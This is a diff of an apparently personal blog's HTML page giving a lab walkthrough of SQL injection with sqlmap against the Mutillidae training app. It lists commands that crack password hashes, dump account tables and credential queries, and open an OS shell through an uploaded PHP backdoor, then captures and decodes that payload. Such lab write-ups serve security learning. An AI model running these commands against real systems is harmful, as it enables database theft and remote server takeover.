@@ -5,19 +5,21 @@
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="os-shell access, capture and inspect the payload">
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.91.2" />
 
   <title>SQL injection with sqlmap &middot; Technical Notes</title>
 
+    
+
   
   
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/2.0.6/pure-min.css">
 
   <!--[if lte IE 8]>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/2.0.6/grids-responsive-old-ie-min.css">
   <![endif]-->
   <!--[if gt IE 8]><!-->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/2.0.6/grids-responsive-min.css">
   <!--<![endif]-->
 
   <!--[if lte IE 8]>
@@ -30,36 +32,32 @@
   <link rel="stylesheet" href="https://tzyluen.github.io/css/blackburn.css">
 
   
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
 
   
-  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Play:wght@400;700&amp;display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Raleway&display=swap" rel="stylesheet" type="text/css">
 
   
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
-ga('create', 'UA-99983797-1', 'auto');
-ga('send', 'pageview');
-</script>
-
-
-  
+ 
   
 
   
-  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
-  <script>hljs.initHighlightingOnLoad();</script>
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/androidstudio.min.css">
+  <script async src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js"></script>
+  
+  
   
 
   <link rel="shortcut icon" href="https://tzyluen.github.io/img/favicon.ico" type="image/x-icon" />
 
   
-    <link rel="stylesheet" href="https://tzyluen.github.io/css/my.css">
+    
+        <link rel="stylesheet" href="https://tzyluen.github.io/css/my.css">
+    
   
   
 
@@ -77,7 +75,7 @@ ga('send', 'pageview');
 <div id="menu">
 
   
-  <a class="pure-menu-heading brand" href="https://tzyluen.github.io/">Notes</a>
+  <a class="pure-menu-heading brand" href="https://tzyluen.github.io/">NOTES</a>
 
 
   <div class="pure-menu">
@@ -98,6 +96,12 @@ ga('send', 'pageview');
       
         <li class="pure-menu-item">
           <a class="pure-menu-link" href="https://tzyluen.github.io/tags/"><i class='fa fa-list fa-fw'></i>Tags</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://tzyluen.github.io/links/"><i class='fa fa-list fa-fw'></i>Links</a>
       
         </li>
       
@@ -177,17 +181,19 @@ ga('send', 'pageview');
 
     
 
+    
+
   </ul>
 </div>
 
 
   <div>
   <div class="small-print">
-    <small>&copy; 2015. All rights reserved.</small>
+    <small>&copy; 2015 - 2022. All rights reserved.</small>
   </div>
   <div class="small-print">
     <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
-    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+    
   </div>
 </div>
 
@@ -198,11 +204,9 @@ ga('send', 'pageview');
 
 
 <div class="header">
-  <h1>SQL injection with sqlmap</h1>
-  <h2>os-shell access, capture and inspect the payload</h2>
+  <h2>SQL injection with sqlmap</h2>
+  <h3>os-shell access, capture and inspect the payload</h3>
 </div>
-
-
 <div class="content">
 
   <div class="post-meta">
@@ -251,214 +255,184 @@ ga('send', 'pageview');
 
 </div>
 
-    
-    <div id="TableOfContents" class="toc col-lg-offset-6">
-      <h2>Table of Contents</h2>
-      <nav id="TableOfContents">
-<ul>
-<li><a href="#scan-for-vulnerability">Scan for vulnerability</a>
-<ul>
-<li><a href="#create-a-http-request-file">Create a HTTP request file</a></li>
-<li><a href="#scan-the-target">Scan the target</a></li>
-<li><a href="#explore-the-vulnerable-target-s-databases-and-system">Explore the vulnerable target&rsquo;s databases and system</a>
-<ul>
-<li><a href="#some-other-commonly-used-options-to-explore-the-system">Some other commonly used options to explore the system:</a></li>
-</ul></li>
-<li><a href="#os-shell-access">OS Shell Access</a>
-<ul>
-<li><a href="#behind-the-scene">Behind the scene</a></li>
-</ul></li>
-<li><a href="#speedup-the-process-and-specify-custom-injection-payloads">Speedup the process and specify custom injection payloads</a></li>
-</ul></li>
-<li><a href="#capture-and-decode-the-payload">Capture and decode the payload</a>
-<ul>
-<li><a href="#with-ngrep">with Ngrep</a></li>
-<li><a href="#with-wireshark">with Wireshark</a></li>
-<li><a href="#decode-the-payload">Decode the payload</a></li>
-</ul></li>
-</ul>
+  <div>
+    <h3>Table of Contents</h3>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scan-for-vulnerability">Scan for vulnerability</a>
+      <ul>
+        <li><a href="#create-a-http-request-file">Create a HTTP request file</a></li>
+        <li><a href="#scan-the-target">Scan the target</a></li>
+      </ul>
+    </li>
+    <li><a href="#explore-the-vulnerable-targets-databases-and-system">Explore the vulnerable target&rsquo;s databases and system</a>
+      <ul>
+        <li><a href="#dictionary-attack-against-password-hashes-and-dump-full-credentials">Dictionary attack against password hashes and dump full credentials</a></li>
+        <li><a href="#os-shell-access">OS Shell Access</a></li>
+        <li><a href="#behind-the-scene">Behind the scene</a></li>
+        <li><a href="#speedup-the-process-and-specify-custom-injection-payloads">Speedup the process and specify custom injection payloads</a></li>
+      </ul>
+    </li>
+    <li><a href="#capture-and-decode-the-payload">Capture and decode the payload</a>
+      <ul>
+        <li><a href="#with-ngrep">with Ngrep</a></li>
+        <li><a href="#with-wireshark">with Wireshark</a></li>
+        <li><a href="#decode-the-payload">Decode the payload</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
-    </div>
-    <hr>
-    
+</div>
 
-  
-
-<h1 id="scan-for-vulnerability">Scan for vulnerability</h1>
-
-<h2 id="create-a-http-request-file">Create a HTTP request file</h2>
-
+<hr>
+<h2 id="scan-for-vulnerability">Scan for vulnerability</h2>
+<h3 id="create-a-http-request-file">Create a HTTP request file</h3>
 <ol>
-<li><p>Use <code>-r</code> option instead of passing long parameters of <code>--url</code>, <code>--user-agent</code>, etc.</p>
-
+<li>
+<p>Use <code>-r</code> option instead of passing long parameters of <code>--url</code>, <code>--user-agent</code>, etc.</p>
 <p><strong>Note:</strong> use packet capture utility such as <code>ngrep</code> to facilitate the process.</p>
-
-<pre><code class="language-text">sqlmap -r REQUESTFILE ...
+<pre tabindex="0"><code>sqlmap -r REQUESTFILE ...
 -r REQUESTFILE      Load HTTP request from a file
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-01.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-01.png" alt="sql-injection-with-sqlmap-01" /></p></li>
+</li>
+<li>
+<p>Clean-up the trailing <code>.</code> (non-printable char displayed by <code>ngrep</code>), and write to a file e.g., <code>mutillidae-login.request</code></p>
 
-<li><p>Clean-up the trailing <code>.</code> (non-printable char displayed by <code>ngrep</code>), and write to a file e.g., <code>mutillidae-login.request</code></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-02.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-02.png" alt="sql-injection-with-sqlmap-02" /></p></li>
+</li>
 </ol>
-
-<h2 id="scan-the-target">Scan the target</h2>
-
+<h3 id="scan-the-target">Scan the target</h3>
 <ol>
-<li><p>Launch the scan with the <code>-r</code> and use the request file created above, it will take some time:</p>
-
-<pre><code class="language-bash">$ sqlmap -r -mutillidae-login.request --batch --banner
+<li>
+<p>Launch the scan with the <code>-r</code> and use the request file created above, it will take some time:</p>
+<pre tabindex="0"><code>$ sqlmap -r -mutillidae-login.request --batch --banner
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-03.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-03.png" alt="sql-injection-with-sqlmap-03" /></p></li>
-
-<li><p>Once a vulnerability is found, it will print the parameter that&rsquo;s vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.</p>
-
+</li>
+<li>
+<p>Once a vulnerability is found, it will print the parameter that&rsquo;s vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.</p>
 <ul>
 <li>boolean-based blind</li>
 <li>error-based</li>
 <li>AND/OR time-based blind</li>
 </ul>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-04.png" alt="sql-injection-with-sqlmap-04" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-04.png" alt="">
 
-<p><strong>Note:</strong> the <code>--technique</code> option can be used to specifically target one type of attack.</p>
-
-<pre><code class="language-text"> --technique=BEUSTQ,
+<p>Note: the <code>--technique</code> option can be used to specifically target one type of attack.</p>
+<pre tabindex="0"><code> --technique=BEUSTQ,
    B=boolean-based blind, E=error-based, U=union-query-based, S=stacked queries,
    T=time-based blind, Q=inline queries
 </code></pre></li>
 </ol>
-
-<h2 id="explore-the-vulnerable-target-s-databases-and-system">Explore the vulnerable target&rsquo;s databases and system</h2>
-
-<p>Once entered the system:</p>
-
+<h2 id="explore-the-vulnerable-targets-databases-and-system">Explore the vulnerable target&rsquo;s databases and system</h2>
+<h3 id="dictionary-attack-against-password-hashes-and-dump-full-credentials">Dictionary attack against password hashes and dump full credentials</h3>
 <ol>
-<li><p>Crack the passwords</p>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --batch --passwords
+<li>
+<p>Once entered the system, crack the passwords</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --batch --passwords
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-05.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-05.png" alt="sql-injection-with-sqlmap-05" /></p></li>
-
-<li><p>List the databases:</p>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --batch --dbs
+</li>
+<li>
+<p>List the databases:</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --batch --dbs
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-06.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-06.png" alt="sql-injection-with-sqlmap-06" /></p></li>
-
-<li><p>List the tables:</p>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
+</li>
+<li>
+<p>List the tables:</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-07.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-07.png" alt="sql-injection-with-sqlmap-07" /></p></li>
-
-<li><p>Dump the <code>nowasp.accounts</code> table:</p>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
+</li>
+<li>
+<p>Dump the <code>nowasp.accounts</code> table:</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
 </code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-08.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-08.png" alt="sql-injection-with-sqlmap-08" /></p></li>
+</li>
 </ol>
-
-<h3 id="some-other-commonly-used-options-to-explore-the-system">Some other commonly used options to explore the system:</h3>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --current-user
+<p>Notes:- Some other commonly used options to explore the system:</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --current-user
 $ sqlmap -r mutillidae-login.request --privileges
 $ sqlmap -r mutillidae-login.request --dbms=mysql -D mysql --sql-query=&quot;select user,password from mysql.user order by user desc&quot;
+</code></pre><h3 id="os-shell-access">OS Shell Access</h3>
+<p>Note: see section <a href="#capture-and-decode-the-payload">Capture and decode the payload</a> to retrieve the payloads.</p>
+<pre tabindex="0"><code>$ sqlmap -r mutillidae-login.request --batch --os-shell
 </code></pre>
-
-<h2 id="os-shell-access">OS Shell Access</h2>
-
-<p><strong>Note:</strong> see section <a href="#capture-and-decode-the-payload">Capture and decode the payload</a> to retrieve the payloads.</p>
-
-<pre><code class="language-bash">$ sqlmap -r mutillidae-login.request --batch --os-shell
-</code></pre>
-
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-09.png" alt="sql-injection-with-sqlmap-09" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-09.png" alt="">
 
 <h3 id="behind-the-scene">Behind the scene</h3>
-
 <p>The file stager (1) <code>tmpuntbv.php</code> is first uploaded to the <code>/var/www/html</code> as explained in section <a href="#capture-and-decode-the-payload">Capture and decode the payload</a>.</p>
-
 <p>Then, the backdoor (2) <code>tmpbyovw.php</code> is uploaded to the server through <code>tmpuntbv.php</code>.</p>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-14.png" alt="sql-injection-with-sqlmap-14" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-14.png" alt="">
 
-<p>All shell commands&rsquo; requests are made through the backdoor script <code>tmpbyovw.php</code> to 192.168.1.9 and results are returned to the 192.168.1.11.</p>
+<p>All shell commands' requests are made through the backdoor script <code>tmpbyovw.php</code> to 192.168.1.9 and results are returned to the 192.168.1.11.</p>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-13.png" alt="sql-injection-with-sqlmap-13" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-13.png" alt="">
 
-<h2 id="speedup-the-process-and-specify-custom-injection-payloads">Speedup the process and specify custom injection payloads</h2>
-
+<h3 id="speedup-the-process-and-specify-custom-injection-payloads">Speedup the process and specify custom injection payloads</h3>
 <p>To speedup the process, pass as many parameters to shorten the processing time. For examples:</p>
-
-<pre><code class="language-bash">-p TESTPARAMETER      Testable parameter(s)
+<pre tabindex="0"><code>-p TESTPARAMETER      Testable parameter(s)
 --dbms=DBMS           Force back-end DBMS to this value
 --technique=TECH      SQL injection techniques to use (default &quot;BEUSTQ&quot;)
-</code></pre>
-
-<hr />
-
-<h1 id="capture-and-decode-the-payload">Capture and decode the payload</h1>
-
+</code></pre><hr>
+<h2 id="capture-and-decode-the-payload">Capture and decode the payload</h2>
 <p>From the sqlmap stdout, pins down the files (payloads) uploaded:</p>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-10.png" alt="sql-injection-with-sqlmap-10" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-10.png" alt="">
 
-<h2 id="with-ngrep">with Ngrep</h2>
+<h3 id="with-ngrep">with Ngrep</h3>
+<pre tabindex="0"><code>$ ngrep -d eth0 -qt -W byline &quot;^GET | ^POST&quot; &quot;port 80 and host 192.168.1.11&quot;
+</code></pre><p>Look for the files uploaded described above:</p>
 
-<pre><code class="language-bash">$ ngrep -d eth0 -qt -W byline &quot;^GET | ^POST&quot; &quot;port 80 and host 192.168.1.11&quot;
-</code></pre>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-11.png" alt="">
 
-<p>Look for the files uploaded described above:
-<img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-11.png" alt="sql-injection-with-sqlmap-11" /></p>
-
-<h2 id="with-wireshark">with Wireshark</h2>
-
-<p>Use the following filters:</p>
-
-<pre><code class="language-bash">Capture filter: not broadcast and not multicast and host 192.168.1.11
+<h3 id="with-wireshark">with Wireshark</h3>
+<p>Use the following capture and display filters:</p>
+<pre tabindex="0"><code>Capture filter: not broadcast and not multicast and host 192.168.1.11
 Display filter (1): http contains &quot;tmpuntbv.php&quot;
 Display filter (2): http contains &quot;tmpbyovw.php&quot;
-</code></pre>
+</code></pre><p>From the matching packet, do 
+<span class="glow-text-app-menu">&#39;Follow&#39;</span>
+ → 
+<span class="glow-text-app-menu">&#39;HTTP Stream&#39;</span>
+:</p>
 
-<p>From the matching packet, <code>Follow</code> &rarr; <code>HTTP Stream</code>:</p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-12.png" alt="">
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-12.png" alt="sql-injection-with-sqlmap-12" /></p>
-
-<h2 id="decode-the-payload">Decode the payload</h2>
-
+<h3 id="decode-the-payload">Decode the payload</h3>
 <p>Unquote the url strings with:</p>
-
-<pre><code class="language-python">import sys
-import urlparse
-import codecs
-buf = urlparse.unquote(sys.argv[1])
-print buf
-</code></pre>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> urlparse
+<span style="color:#f92672">import</span> codecs
+buf <span style="color:#f92672">=</span> urlparse<span style="color:#f92672">.</span>unquote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
+print buf</code></pre></div>
 <p>produces,</p>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-15.png" alt="sql-injection-with-sqlmap-15" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-15.png" alt="">
 
-<p>and decodes the hex (starting from <del>0x</del>3c3f&hellip; until &hellip;3e0a) with,</p>
-
-<pre><code class="language-python">payload = sys.argv[1]
-print codecs.decode(payload, &quot;hex&quot;)
-</code></pre>
-
+<p>and decodes the hex (starting from <del>0x</del><code>3c3f</code>&hellip; until &hellip;<code>3e0a</code>) with,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+print codecs<span style="color:#f92672">.</span>decode(payload, <span style="color:#e6db74">&#34;hex&#34;</span>)</code></pre></div>
 <p>produces,</p>
 
-<p><img src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-16.png" alt="sql-injection-with-sqlmap-16" /></p>
+<img class="pure-img" src="https://tzyluen.github.io/img/sql-injection-with-sqlmap-16.png" alt="">
 
 <p>the code basically handling file uploads and also change the uploaded files permission to <code>0755</code>.</p>
 
+  
+  
 
   
 <div class="prev-next-post pure-g">
@@ -492,15 +466,31 @@ print codecs.decode(payload, &quot;hex&quot;)
 </div>
 
 
+  
+  
+  
+  
 
   
+
 
 </div>
 
 </div>
 </div>
 <script src="https://tzyluen.github.io/js/ui.js"></script>
+<script src="https://tzyluen.github.io/js/menus.js"></script>
 
+
+
+
+
+
+
+
+<script src="https://tzyluen.github.io/js/math-code.js"></script>
+  <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  
 
 
 
